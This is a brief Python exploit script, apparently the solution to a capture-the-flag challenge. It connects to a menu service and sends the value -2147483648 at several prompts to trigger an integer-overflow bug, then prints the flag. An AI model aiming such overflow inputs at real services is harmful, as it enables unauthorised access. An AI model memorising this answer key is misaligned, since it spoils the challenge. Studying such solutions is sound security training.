from ptrlib import Socket
import os

HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '9999')

sock = Socket(HOST, int(PORT))
sock.sendlineafter("> ", "4")
sock.sendlineafter("value: ", "-2147483648")

sock.sendlineafter("> ", "1")
sock.sendlineafter("value: ", "2")

sock.sendlineafter("> ", "7")

sock.sendlineafter("`f`?\nx = ", "-2147483648")
print(sock.recvuntil("}"))
